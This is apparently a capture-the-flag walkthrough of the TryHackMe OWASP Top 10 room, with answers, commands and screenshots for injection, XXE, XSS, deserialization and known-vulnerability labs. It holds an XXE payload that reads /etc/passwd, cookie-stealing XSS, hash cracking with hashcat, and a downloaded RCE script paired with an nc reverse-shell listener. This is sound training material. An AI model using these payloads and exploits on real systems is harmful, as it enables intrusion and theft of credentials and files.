# OWASP Top 10

## :syringe: \[Day 1] Command Injection Practical

{% content-ref url="../../easy/walkthroughs/injection.md" %}
[injection.md](../../easy/walkthroughs/injection.md)
{% endcontent-ref %}

## \[Day 2] Broken Authentication Practical

### #1 **What is the flag that you found in darren's account?**

![](<../../.gitbook/assets/Screenshot from 2020-08-26 19-26-24.png>)

### **#3 What is the flag that you found in arthur's account?**

![](<../../.gitbook/assets/Screenshot from 2020-08-26 19-27-34.png>)

## :secret: \[Day 3] Sensitive Data Exposure

### **#1 What is the name of the mentioned directory?**

![](<../../.gitbook/assets/Screenshot from 2020-08-26 20-39-16.png>)

### **#2 Navigate to the directory you found in question one. What file stands out as being likely to contain sensitive data?**

![](<../../.gitbook/assets/Screenshot from 2020-08-26 19-50-23.png>)

### **#3 What is the password hash of the admin user?**

```bash
wget http://10.10.63.208/assets/webapp.db
sqlite3 webapp.db
.table
.schema users
SELECT * FROM users;
```

![](<../../.gitbook/assets/Screenshot from 2020-08-26 19-52-14.png>)

### **#4 What is the admin's plaintext password?**

```bash
echo '6eea9b7ef19179a06954edd0f6c05ceb' > md5.txt
hashcat -a 0 -m 0 md5.txt /usr/share/wordlists/rockyou.txt
```

![](<../../.gitbook/assets/Screenshot from 2020-08-26 19-55-56.png>)

### **#5 Login as the admin. What is the flag?**

![](<../../.gitbook/assets/Screenshot from 2020-08-26 20-46-26.png>)

## :bookmark\_tabs: \[Day 4] XML External Entity - eXtensible Markup Language

### #1 **Full form of XML**

```
eXtensible Markup Language
```

### #2 **Is it compulsory to have XML prolog in XML documents?**

```
No
```

### #3 **Can we validate XML documents against a schema?**

```
Yes
```

### #4 **How can we specify XML version and encoding in XML document?**

```
XML Prolog
```

## :bookmark\_tabs: \[Day 4] XML External Entity - DTD

### #1 **How do you define a new ELEMENT?**

```
!ELEMENT
```

### #2 **How do you define a ROOT element?**

```
!DOCTYPE
```

### #3 **How do you define a new ENTITY?**

```
!ENTITY
```

## :bookmark\_tabs: \[Day 4] XML External Entity - XXE Payload

```markup
<!DOCTYPE replace [<!ENTITY name "feast"> ]>
<userInfo>
  <firstName>falcon</firstName>
  <lastName>&name;</lastName>
</userInfo>
```

```markup
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
<root>&read;</root>
```

## :bookmark\_tabs: \[Day 4] XML External Entity - Exploiting

### #3 **What is the name of the user in /etc/passwd**

![](<../../.gitbook/assets/Screenshot from 2020-08-26 21-24-32.png>)

### **#4 Where is falcon's SSH key located?**

```bash
/home/falcon/.ssh/id_rsa
```

### **#5 What are the first 18 characters for falcon's private key**

```bash
echo -n 'MIIEogIBAAKCAQEA7bq7Uj0ZQzFiWzK' | cut -c -18
```

![](<../../.gitbook/assets/Screenshot from 2020-08-26 21-25-18.png>)

## :door: \[Day 5] Broken Access Control (IDOR Challenge)

### #3 **Look at other users notes. What is the flag?**

![](<../../.gitbook/assets/Screenshot from 2020-08-26 21-38-41.png>)

## ****:pencil: \[Day 6] Security Misconfiguration

### **#2 Hack into the webapp, and find the flag!**

![](<../../.gitbook/assets/Screenshot from 2020-08-26 21-48-03.png>)

![](<../../.gitbook/assets/Screenshot from 2020-08-26 21-46-34.png>)

## :warning: **** \[Day 7] Cross-site Scripting

### #2 **Go to http://10.10.94.53/reflected and craft a reflected XSS payload that will cause a popup saying "Hello".**

```markup
<script>alert("Hello")</script>
```

![](<../../.gitbook/assets/Screenshot from 2020-08-26 22-03-56.png>)

### #3 **On the same reflective page, craft a reflected XSS payload that will cause a popup with your machines IP address.**

```markup
<script>alert(window.location.hostname)</script>
```

![](<../../.gitbook/assets/Screenshot from 2020-08-26 22-10-18.png>)

### #4 **Then add a comment and see if you can insert some of your own HTML.**

```markup
<h1>test</h1>
```

![](<../../.gitbook/assets/Screenshot from 2020-08-26 22-13-06.png>)

### #5 **On the same page, create an alert popup box appear on the page with your document cookies.**

```markup
<script>alert(document.cookie)</script>
```

![](<../../.gitbook/assets/Screenshot from 2020-08-26 22-15-00.png>)

### #6 **Change "XSS Playground" to "I am a hacker" by adding a comment and using Javascript.**

```markup
<script>document.getElementById("thm-title").textContent="I am a hacker"</script>
```

![](<../../.gitbook/assets/Screenshot from 2020-08-26 22-18-22.png>)

## :desert: \[Day 8] Insecure Deserialization

### &#x20;**#1 Who developed the Tomcat application?**

```
The Apache Software Foundation
```

### #2 **What type of attack that crashes services can be performed with insecure deserialization?**

```
Denial of Service
```

## :desert: \[Day 8] Insecure Deserialization - Objects

### #1 **if a dog was sleeping, would this be:**

```
A behavior
```

## :desert: \[Day 8] Insecure Deserialization - Deserialization

### #1 **What is the name of the base-2 formatting that data is sent across a network as?**&#x20;

```
binary
```

## :cookie: \[Day 8] Insecure Deserialization - Cookies

### #1 **If a cookie had the path of webapp.com/login , what would the URL that the user has to visit be?**

```
webapp.com/login
```

### **#2 What is the acronym for the web technology that Secure cookies work over?**

```
https
```

## :cookie: \[Day 8] Insecure Deserialization - Cookies Practical

### #1 **1st flag (cookie value)**

```
echo -n 'gAN9cQAoWAkAAABzZXNzaW9uSWRxAVggAAAAOTVkNWFmYzZiMmNiNDI2M2FkOGU1ZmViMmE3MmJhYjBxAlgLAAAAZW5jb2RlZGZsYWdxA1gYAAAAVEhNe2dvb2Rfb2xkX2Jhc2U2NF9odWh9cQR1Lg==' | base64 -d
```

![](<../../.gitbook/assets/Screenshot from 2020-08-26 23-23-09.png>)

### **#2 2nd flag (admin dashboard)**

![](<../../.gitbook/assets/Screenshot from 2020-08-26 23-23-51.png>)

## :cookie: \[Day 8] Insecure Deserialization - Remote Code Execution

### #1 **flag.txt**

```bash
wget https://gist.githubusercontent.com/CMNatic/af5c19a8d77b4f5d8171340b9c560fc3/raw/f0fce6310455d8c345bbc9ec81f41d224896b9c5/rce.py
sed -i 's/YOUR_TRYHACKME_VPN_IP/10.9.101.193/' rce.py
python rce.py
```

```
nc -nvlp 4444
```

![](<../../.gitbook/assets/Screenshot from 2020-08-27 09-36-58.png>)

## :sunglasses: \[Day 9] Components With Known Vulnerabilities - Practical

### **#1 How many characters are in /etc/passwd**

```bash
searchsploit book store remote code execution
cp /usr/share/exploitdb/exploits/php/webapps/47887.py .
python3 47887.py http://10.10.213.160
```

![](<../../.gitbook/assets/Screenshot from 2020-08-27 10-15-17.png>)

## :notebook\_with\_decorative\_cover: \[Day 10] Insufficient Logging and Monitoring

### #1 **What IP address is the attacker using?**

```
cat login-logs.txt
```

![](<../../.gitbook/assets/Screenshot from 2020-08-26 23-07-13.png>)

### #2 **What kind of attack is being carried out?**

```
brute forces
```

## Support Material

{% embed url="https://www.tutorialspoint.com/dtd/dtd_entities.htm" %}

{% embed url="https://www.quora.com/What-is-the-state-and-behaviour-of-an-object" %}

{% embed url="https://gist.githubusercontent.com/CMNatic/af5c19a8d77b4f5d8171340b9c560fc3/raw/f0fce6310455d8c345bbc9ec81f41d224896b9c5/rce.py" %}

{% embed url="https://www.exploit-db.com/exploits/47887" %}

